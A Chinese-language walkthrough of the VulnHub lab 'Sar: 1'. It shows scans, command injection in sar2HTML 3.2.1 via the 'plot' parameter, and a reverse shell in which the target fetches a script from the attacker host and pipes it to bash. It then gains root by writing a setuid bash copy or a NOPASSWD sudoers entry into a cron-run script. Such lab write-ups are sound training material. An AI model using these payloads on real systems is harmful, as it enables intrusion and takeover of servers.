# Sar: 1

2024-5-20 https://www.vulnhub.com/entry/sar-1,425/

difficulty: easy

## IP

192.168.5.30

## Scan

Open Port -> 80

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

只有 80 web 服务，直接干。gobuster 扫描：

```
http://192.168.5.30/index.html           (Status: 200) [Size: 10918]
http://192.168.5.30/robots.txt           (Status: 200) [Size: 9]
http://192.168.5.30/phpinfo.php          (Status: 200) [Size: 95387]
```

http://192.168.5.30/robots.txt 显示 sar2HTML

继续访问 http://192.168.5.30/sar2HTML Sar2html 可以将 sar 程序执行的二进制结果数据转成图形的 HTML 格式

看到左上角版本为 sar2html Ver 3.2.1，寻找是否有对应的漏洞 exp，发现 https://www.exploit-db.com/exploits/47204

进行漏洞利用：

```
curl -G --data-urlencode 'plot=;pwd' http://192.168.5.30/sar2HTML/index.php
```

可以看到 Select Host 中出现了 /var/www/html/sar2HTML，漏洞存在证明成功

直接是进行反弹 shell，kali 上监听 8888：

```
curl -G --data-urlencode 'plot=;curl http://192.168.5.3/5.3/8888.sh | bash' http://192.168.5.30/sar2HTML/index.php
```

得到了反弹的 shell，先升级下 tty，目标上有 python3.

/etc/crontab 发现了自定义的计划任务：

```
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```

```
www-data@sar:/var/www/html$ cat finally.sh
#!/bin/sh

./write.sh

www-data@sar:/var/www/html$ cat write.sh
#!/bin/sh

touch /tmp/gateway

```

write.sh 具有 777 的权限，可以直接修改得到 root 权限：

```
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' >> write.sh
或
echo '/bin/echo "www-data ALL=(ALL)NOPASSWD:ALL" >> /etc/sudoers' > write.sh
```

等待 5 分钟，www-data 就有了免密的 sudo 权限，直接 sudo su 切换到 root 用户：

```
root@sar:~# cat root.txt
66f93d6b2ca96c9ad78a8a9ba0008e99
root@sar:~# id
uid=0(root) gid=0(root) groups=0(root)
```
